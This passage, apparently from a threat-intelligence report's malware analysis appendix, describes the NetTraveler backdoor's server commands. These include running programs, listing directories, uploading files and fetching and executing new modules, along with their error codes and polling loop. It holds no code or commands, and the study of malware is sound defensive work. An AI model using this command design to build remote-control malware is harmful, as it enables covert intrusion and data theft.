+information about free space. Client command
+success code is 0, error code is not defined.
+5009: Run application. Run local application
+with path and command line arguments passed
+from the server. Client command success code
+is 0, error code is 7005.
+5017: Get recursive directory listing. Provide
+recursive directory listing. Client command suc
+cess code is 0, error code is 7000.
+5025: Run pushed executable. This command
+is used to save file pushed by the server and run
+instantly. When this command is received the
+module checks if it can create a new file, which
+name is passed by the server response. If it
+fails it submits error code 7003. Then it spawns
+a new thread which issues a new HTTP Post
+request with command id 3005 and system in
+formation attached in the CGI Path. The request
+46
+The NetTraveler
+of the server should contain file data to write to
+the already opened file and execute right away.
+5026: Upload file to the server. The command
+is used to read local file and transfer it to the
+server. It gets file information, including time
+stamps and size and spawns a new thread. If any
+of those operations fails the module reports er
+ror code 7003 to the server. Otherwise it reports
+success code 0 and spawns a new thread. The
+new thread reads the file specified in the request
+and uploads it to the server.
+1039: Download and run new module.
+The module uses ParamB as an integer value
+indicating a length of a string to read next from
+the server response. The received string will be
+used as a NewFilename. Then it reads another
+DWORD value from the server response and
+interprets it as a size of the following data to
+read. After that a new directory “Internet Ex
+plorer” is created in the directory of the current
+running module. Then the module creates a new
+file using the value NewFilename pushed by the
+server. The module makes 2 attempts to start a
+new process: by calling CreateProcessA system
+API and ShellExecuteA if the previous call failed.
+                            The code was designed to support more com
+
+mands (1028, 1029, 1032, 1033, 1034, 1035,
+1036), however they are now falling into com
+mand 1029 handler and then ignored. We cre
+ated a chart showing a tree of commands de
+pendencies:
+Appendix A: Malware technical analysis
+The execution of this command processing thread continues in a loop until it is interrupt
+ed by Shutdown command coming from the server. The code starts new loop iteration
+after hardcoded value of 30 seconds.
+47
